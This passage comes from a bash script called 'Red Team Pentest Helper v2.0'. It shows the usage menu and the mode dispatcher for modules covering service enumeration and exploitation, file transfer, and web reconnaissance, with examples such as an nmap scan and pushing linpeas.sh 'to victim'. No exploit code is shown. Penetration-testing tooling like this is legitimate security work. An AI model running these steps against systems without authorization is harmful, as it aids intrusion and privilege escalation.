    echo -e "${C_BOLD}═══════════════════════════════════════════════════════${C_ENDC}"
    echo -e "${C_BOLD}            RED TEAM PENTEST HELPER v2.0 ${C_ENDC}"
    echo -e "${C_BOLD}═══════════════════════════════════════════════════════${C_ENDC}"
    echo ""
    echo -e "${C_BOLD}USAGE:${C_ENDC}"
    echo "  $0 --infra|-i [options] <target>  : Service Enumeration & Exploitation"
    echo "  $0 --file|-f [options] ...        : File Transfer Helper"
    echo "  $0 --web|-w <target> [flags]      : Web Reconnaissance"
    echo "  $0 --examples|-e                  : Show Common Use Cases"
    echo "  $0 --install-completion           : Generate Bash Completion"
    echo ""
    echo -e "${C_BOLD}QUICK START:${C_ENDC}"
    echo "  # View examples and cheat sheet"
    echo "  $0 -e"
    echo ""
    echo "  # Get detailed help for a specific module"
    echo "  $0 -i -h"
    echo "  $0 -f -h"
    echo "  $0 -w -h"
    echo ""
    echo -e "${C_BOLD}COMMON EXAMPLES:${C_ENDC}"
    echo "  # Scan a target with Nmap (using alias)"
    echo "  $0 -i -nmap 10.10.10.10"
    echo ""
    echo "  # Transfer file to victim (using alias)"
    echo "  $0 -f tun0 linpeas.sh"
    echo ""
    echo "  # Web subdomain discovery (using alias)"
    echo "  $0 -w example.com --all"
    echo ""
    exit 1
fi

MODE="$1"
case "$MODE" in
    --infra|-i) shift; module_infra "$@" ;;
    --file|-f) shift; module_file "$@" ;;
    --web|-w) shift; module_web "$@" ;;
    --examples|-e) show_examples ;;
    --install-completion) generate_completion ;;
    -h|--help) 
        echo -e "${C_BOLD}Red Team Pentest Helper v2.0${C_ENDC}"
        echo ""
        echo "Use -i/-f/-w (or --infra/--file/--web) followed by -h for specific help."
        echo "Use -e (or --examples) for a comprehensive cheat sheet."
        ;;
    *) 
        log_error "Invalid mode: $MODE"
        echo ""
        echo -e "${C_WARNING}Did you mean one of these?${C_ENDC}"
        echo "  -i | --infra    : Infrastructure enumeration"
        echo "  -f | --file     : File transfer helper"
        echo "  -w | --web      : Web reconnaissance"
        echo "  -e | --examples : Show examples and cheat sheet"
        echo ""
        echo "Run '$0' without arguments to see the full help menu."
        exit 1
        ;;
esac